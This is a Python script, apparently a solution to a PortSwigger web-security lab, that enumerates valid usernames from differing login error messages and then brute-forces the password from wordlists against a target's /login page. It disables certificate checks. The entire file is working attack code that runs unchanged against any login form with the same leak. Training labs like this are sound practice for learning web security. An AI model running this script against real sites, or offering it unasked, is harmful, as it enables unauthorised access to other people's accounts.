# Lab: Username enumeration via different responses
# Lab link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
import sys
import urllib3
import requests
import shutil
import signal
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def interrupt_handler(signum,frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)
# ctrl + C
signal.signal(signal.SIGINT, interrupt_handler)

def login(url,username,password):
    data = {'username': username, 'password': password}
    r = requests.post(url, data, allow_redirects=False, verify=False)
    if r.status_code == 302:
        return 2
    if 'Invalid username' not in r.text:
        return 1
    return False

def enumerate_username(url,username_filename):
    with open(username_filename, 'r') as users_file:
        for user in users_file:
            username = user.rstrip()
            msg = f'[ ] Brute force username: {username}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end = '\r', flush = True)
            if login(url,username,'XXX') == 1:
                msg = f'[+] Username found: {username}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end = '\n', flush = True)
                return username
    print('[-] Failed to find username')
    return False

def enumerate_password(url,username,password_file):
    with open(password_file, 'r') as passwords_file:
        for passwords in passwords_file:
            password = passwords.rstrip()
            msg = f'[ ] Brute force password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end = '\r', flush = True)
            if login(url,username,password) == 2:
                msg = f'[+] Password found: {password}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end = '\n', flush = True)
                return password
    print('[-] Failed to find password')
    return False

def main():
    print('[+] Username enumeration via different responses')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)
    url = f'{host}/login'
    username = enumerate_username(url,'candidate_usernames.txt')

    if not username:
        sys.exit(-2)

    password = enumerate_password(url,username,'candidate_passwords.txt')
    if not password:
        sys.exit(-3)

if __name__ == '__main__':
    main()